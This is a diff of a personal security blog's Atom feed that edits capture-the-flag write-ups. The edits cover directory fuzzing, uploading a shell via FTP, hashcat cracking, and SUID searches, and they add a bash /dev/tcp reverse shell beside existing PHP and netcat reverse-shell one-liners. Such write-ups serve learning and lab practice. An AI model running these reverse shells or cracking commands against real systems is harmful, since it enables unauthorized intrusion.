@@ -4,7 +4,7 @@
  <title>0xbeven - Blog Site</title>
  <link href="https://beven.co.zw/atom.xml" rel="self"/>
  <link href="https://beven.co.zw/"/>
- <updated>2021-03-26T22:38:42+02:00</updated>
+ <updated>2021-03-26T23:31:16+02:00</updated>
  <id>https://beven.co.zw</id>
  <author>
    <name>Beven Nyamande</name>
@@ -67,7 +67,7 @@ Service Info: OSs: Unix, Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE
 &lt;h1 id=&quot;directory-enumeration&quot;&gt;Directory Enumeration&lt;/h1&gt;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;
-&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirb/big.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.200.21/FUZZ &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;
+ffuf &lt;span class=&quot;nt&quot;&gt;-w&lt;/span&gt; /usr/share/wordlists/dirb/big.txt &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; http://10.10.200.21/FUZZ &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt;
 
         /&lt;span class=&quot;s1&quot;&gt;'___\  /'&lt;/span&gt;___&lt;span class=&quot;se&quot;&gt;\ &lt;/span&gt;          /&lt;span class=&quot;s1&quot;&gt;'___\
        /\ \__/ /\ \__/  __  __  /\ \__/
@@ -94,7 +94,19 @@ ________________________________________________
 files                   [Status: 301, Size: 312, Words: 20, Lines: 10]
 server-status           [Status: 403, Size: 277, Words: 20, Lines: 10]
 &lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-&lt;p&gt;we can upload a shell in the ftp directory since executable permission are set…&lt;/p&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;We can upload a shell in the ftp directory since executable permission are set…&lt;/li&gt;
+  &lt;li&gt;After upload a shell in ftp you can access it via http://IP/files/ and execute the shell&lt;/li&gt;
+  &lt;li&gt;Boom you get shell&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;h1 id=&quot;check-hints-for-usertxt&quot;&gt;Check hints for user.txt&lt;/h1&gt;
+
+&lt;ul&gt;
+  &lt;li&gt;note the /incidents directory in the / path&lt;/li&gt;
+  &lt;li&gt;use strings and find for the password&lt;/li&gt;
+&lt;/ul&gt;
 
 </content>
  </entry>
@@ -184,9 +196,8 @@ Service Info: OS: Linux&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; CPE: cpe:/
 
 &lt;h1 id=&quot;hashcat&quot;&gt;Hashcat&lt;/h1&gt;
 
-&lt;ul&gt;
-  &lt;li&gt;hashcat -m 1800 -a 0 hash.txt rockyou.txt&lt;/li&gt;
-&lt;/ul&gt;
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hashcat &lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt; 1800 &lt;span class=&quot;nt&quot;&gt;-a&lt;/span&gt; 0 hash.txt rockyou.txt
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h1 id=&quot;find-command&quot;&gt;Find command&lt;/h1&gt;
 
@@ -201,7 +212,7 @@ find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;
 /usr/bin/menu
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
-&lt;p&gt;&lt;img src=&quot;/assets/images/kenobi.png&quot; style=&quot;width:90%;&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&quot;/assets/images/kenobi.png&quot; style=&quot;align:center&quot; /&gt;&lt;/p&gt;
 
 &lt;h1 id=&quot;upgrading-to-a-shell&quot;&gt;Upgrading to a shell&lt;/h1&gt;
 
@@ -213,6 +224,7 @@ find / &lt;span class=&quot;nt&quot;&gt;-perm&lt;/span&gt; &lt;span class=&quot;
 
 &lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;php &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'$sock=fsockopen(&quot;x.x.x.x&quot;,4444);exec(&quot;/bin/sh -i &amp;lt;&amp;amp;3 &amp;gt;&amp;amp;3 2&amp;gt;&amp;amp;3&quot;);'&lt;/span&gt;
 &lt;span class=&quot;nb&quot;&gt;rm&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;mkfifo&lt;/span&gt; /tmp/f&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt; /tmp/f|/bin/sh &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 2&amp;gt;&amp;amp;1|nc 10.10.2.97 9001 &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;/tmp/f
+bash &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/10.2.8.75/8080 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;
 &lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
 
 &lt;h1 id=&quot;blind-os-injection&quot;&gt;Blind OS injection&lt;/h1&gt;
